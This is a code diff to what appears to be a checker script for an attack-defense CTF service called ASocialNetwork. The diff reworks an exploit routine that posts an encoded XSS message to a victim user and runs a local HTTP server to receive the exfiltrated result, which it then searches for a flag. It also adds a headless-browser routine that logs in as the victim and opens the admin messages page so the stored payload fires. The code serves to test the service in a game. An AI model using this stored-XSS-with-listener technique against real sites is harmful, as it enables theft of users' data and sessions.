@@ -57,7 +57,7 @@ async def login(task, client, username, password, logger):
 
 async def sendMessage(task, client, recipient, message, logger):
     username = secrets.token_hex(32)
-    password = secrets.token_hex(32)
+    password = 'password'
     encoded_message = encode(message, recipient, logger)
     cookie = await register(task, client, username, password, logger)
     await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": recipient, "message": encoded_message}, cookies=cookie)
@@ -134,26 +134,31 @@ def server(logger):
             self.end_headers()
             self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())
     webServer[0] = HTTPServer((HOST, PORT), MyServer)
-    print("Server started http://%s:%s" % (HOST, PORT))
+    logger.debug("Server started http://%s:%s" % (HOST, PORT))
     try:
         webServer[0].serve_forever()
     except KeyboardInterrupt:
         pass
 
     webServer[0].server_close()
+    time.sleep(1)
     print("Server stopped.")
 
 
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
-    threading.Thread(target=server, args=(logger, )).start()
+    server_thread = threading.Thread(target=server, args=(logger, ))
+    server_thread.start()
     cookie = await login(task, client, "a", "a", logger)
-    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": task.attack_info, "message": encode(exploitMessage, task.attack_info, logger)}, cookies=cookie)
+    target = json.loads(task.attack_info)['username']
+    r = await client.post(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/", json={"recipient": target, "message": encode(exploitMessage, target, logger)}, cookies=cookie)
     assert_equals(r.status_code, 200, "exploit failed")
+    xss_test(task, logger)
     while not result[0]:
         time.sleep(0.1)
-    logger.debug(result[0])
-    webServer[0].server_close()
+    webServer[0].shutdown()
+    server_thread.join()
+    logger.debug('Server stopped')
     if flag := searcher.search_flag(result[0]):
         return flag
 
@@ -171,6 +176,21 @@ def xss(task, start, logger):
         reloads += 1
     logger.debug(reloads)
     driver.quit()
+
+
+def xss_test(task, logger):
+    chrome_options = webdriver.ChromeOptions()
+    chrome_options.add_argument("--headless")
+    chrome_options.add_argument('--no-sandbox')
+    driver = webdriver.Chrome('/usr/lib/chromium-browser/chromedriver', options=chrome_options)
+    driver.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/login")
+    driver.execute_script(f"document.getElementById('username').value = '{json.loads(task.attack_info)['username']}';")
+    driver.execute_script(f"document.getElementById('password').value = 'password';")
+    driver.execute_script("document.getElementsByTagName('form')[0].submit();")
+    driver.get(f"http://{task.address + ':' + str(SERVICE_PORT)}/messages/admin")
+    driver.refresh()
+    time.sleep(1)
+    driver.close()
 
 
 if __name__ == "__main__":
